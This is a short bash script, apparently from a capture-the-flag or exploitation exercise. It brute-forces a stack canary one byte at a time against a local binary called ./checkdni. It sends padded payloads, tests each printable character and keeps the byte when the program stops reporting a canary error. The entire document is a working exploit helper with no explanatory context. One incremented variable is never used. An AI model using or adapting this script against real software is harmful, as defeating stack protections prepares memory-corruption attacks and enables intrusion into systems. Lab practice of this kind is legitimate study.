#!/bin/bash

initial_bytes=9
aux=$(($initial_bytes - 9))
size=$(($initial_bytes-$aux))

echo "[*] Bruteforcing canary..."

for x in `seq 5`; do
	initial_bytes=$(($initial_bytes + $x))
	buf=$(for i in `seq $size`; do echo -n "A";done)
	for((i=33;i<127;i++)); do
		current_canary=$(printf "\\$(printf %03o "$i")")
		payload=${buf}${old_canary}${current_canary}
		echo "payload: "$payload
		result=$(echo -ne "$payload"$'\n' | ./checkdni)
		if [ "$(echo -n $result | grep -v canary)" ]; then
			old_canary=${old_canary}${current_canary}
			break
		fi
	done
done

echo -e "[*] End bruteforcing. Canary found: $old_canary"

